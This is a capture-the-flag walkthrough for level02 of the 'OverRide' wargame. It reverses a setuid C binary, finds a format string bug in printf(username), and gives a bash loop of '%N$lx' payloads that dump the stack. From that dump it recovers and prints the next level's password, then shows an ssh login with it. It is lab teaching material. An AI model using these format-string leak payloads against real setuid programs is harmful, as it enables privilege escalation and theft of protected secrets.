# LEVEL02 - FORMAT STRING EXPLOITATION 1 - READ MEMORY

We have a binary named level02 at /home/users/level02/

It is owned by `level03` and has a `setuid bit`

The program first define some buffers and variables
```c
int main(void)
{
	char password[96];
	char ptr[48];
	char username[96];
	int passwordSize;
	FILE *stream;
```

And initialize them with zeroes
```c
memset(username, 0, sizeof(username));
memset(ptr, 0, 41);
memset(password, 0, sizeof(password));
stream = 0;
passwordSize = 0;
```

Then the program tries to open the file `/home/users/level03/.pass` to read it and compare the number of characters read to `41`

This is likely a `gdb` protection to prevent users from reversing the binary since the `setuid bit` is not effective in `gdb` and thus, we have not the read rights on this file
```c
stream = fopen("/home/users/level03/.pass", "r");
if ( !stream )
{
	fwrite("ERROR: failed to open password file\n", 1, 36, stderr);
	exit(1);
}

passwordSize = fread(ptr, 1, 41, stream);
ptr[strcspn(ptr, "\n")] = 0;
if ( passwordSize != 41 )
{
	fwrite("ERROR: failed to read password file\n", 1, 36, stderr);
	fwrite("ERROR: failed to read password file\n", 1, 36, stderr);
	exit(1);
}
fclose(stream);
```

Then it prints some lines and prompts for a `username` and a `password`
```c
puts("===== [ Secure Access System v1.0 ] =====");
puts("/***************************************\\");
puts("| You must login to access this system. |");
puts("\\**************************************/");

printf("--[ Username: ");
fgets(username, 100, stdin);
username[strcspn(username, "\n")] = 0;

printf("--[ Password: ");
fgets(password, 100, stdin);
password[strcspn(password, "\n")] = 0;
	
puts("*****************************************");
```

We can see that we overflow only 4 bytes in each buffer which means we can't overwrite the return address of main like in level01
```c
char password[96];
char username[96];

fgets(username, 100, stdin);
fgets(password, 100, stdin);
```

The program then compares the `password` typed by the user and the content of the file it has read

If both are not equal we exit the program, else we launch `system("/bin/sh")`
```c
	if (strncmp(ptr, password, 41))
	{
		printf(username);
		puts(" does not have access!");
		exit(1);
	}
	printf("Greetings, %s!\n", username);
	system("/bin/sh");
	return 0;
}
```

And here we can observe that the `username` is passed directly to printf without any form of parsing which means this program is vulnerable to Format String Exploitation
```c
printf(username);
```

We can also see that the content of the file that we need (`/home/users/level03/.pass`) is actually loaded into the memory since it was opened and read from, we can use `%x` or `%lx` directly inside the username to get a dump of the program's stack

Here is a little bash loop that will gracefully display the dump
```bash
#!/bin/bash
for i in $(seq 1 $1); do
	echo "$i:	$(echo -n "a %$i\$lx" | /home/users/level02/level02 | sed -n '6p' | cut -d' ' -f2)"
done
```

We know that the password is 41 bytes long  (including `\0`), every bytes is a printable character and all ascii printable characters are between 21(hex) and 7e(hex) so we can already cleanup the dump
```
22:     756e505234376848
23:     45414a3561733951
24:     377a7143574e6758
25:     354a35686e475873
26:     48336750664b394d
```

We are left with a 40 consecutive displayable bytes which we invert back to big endian
```
4868373452506e75
51397361354a4145
58674e5743717a37
7358476e68354a35
4d394b6650673348
```

Then we traduce to ASCII
```
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```

Let's try the flag
```
ssh -p 42421 level03@$WINIP
           ____                  ____  _     __
          / __ \_   _____  _____/ __ \(_)___/ /__
         / / / / | / / _ \/ ___/ /_/ / / __  / _ \
        / /_/ /| |/ /  __/ /  / _, _/ / /_/ /  __/
        \____/ |___/\___/_/  /_/ |_/_/\__,_/\___/

                       Good luck & Have fun

   To start, ssh with level00/level00 on 10.0.2.15:4242
level03@172.29.64.1's password:

RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   /home/users/level03/level03
level03@OverRide:~$
```